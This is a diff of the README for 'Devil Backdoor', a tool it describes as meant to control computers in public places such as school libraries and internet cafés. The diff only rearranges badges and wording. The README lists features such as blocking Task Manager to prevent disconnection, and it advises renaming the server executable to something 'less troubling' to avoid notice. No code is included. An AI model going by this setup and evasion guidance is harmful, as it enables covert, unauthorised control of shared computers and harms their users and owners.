@@ -1,12 +1,12 @@
 # ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/assets/logo.png) Devil Backdoor 
 
-[![license](https://img.shields.io/github/license/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/blob/master/LICENSE)
-[![GitHub repo size in bytes](https://img.shields.io/github/repo-size/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor)
-[![GitHub last commit](https://img.shields.io/github/last-commit/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/commits/master)
+This is a simple backdoor made to control computers in various public places, like school library, internet café, etc.
 
  ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/assets/preview.png)
 
-This is a simple backdoor made to control computers in various public places, like school library, internet café, and so on.
+[![license](https://img.shields.io/github/license/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/blob/master/LICENSE)
+[![GitHub repo size in bytes](https://img.shields.io/github/repo-size/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor)
+[![GitHub last commit](https://img.shields.io/github/last-commit/Kirlovon/Devil-Backdoor.svg)](https://github.com/Kirlovon/Devil-Backdoor/commits/master)
 
 ## Features
 * **Show MessageBox** - allows you to show a window with a message! _(Important: Only English letters are supported)_
@@ -17,7 +17,8 @@ This is a simple backdoor made to control computers in various public places, li
 * **Block Task Manager** - allows you to block the task manager. This feature can be used to prevent server disconnection.
 
 ## How to use it?
-#### [Download](https://github.com/Kirlovon/Devil-Backdoor/releases)
+### [DOWNLOAD](https://github.com/Kirlovon/Devil-Backdoor/releases)
+
 ### 1. Server setup
 
 First, you need to make sure that all computers are connected to the same shared folder. You must put the **Devil-Server.exe** _(You can rename this file for something less troubling)_ and the **config.ini** _(This file can not be renamed)_ in the same folder, at any place on the hard drive of the computer. 
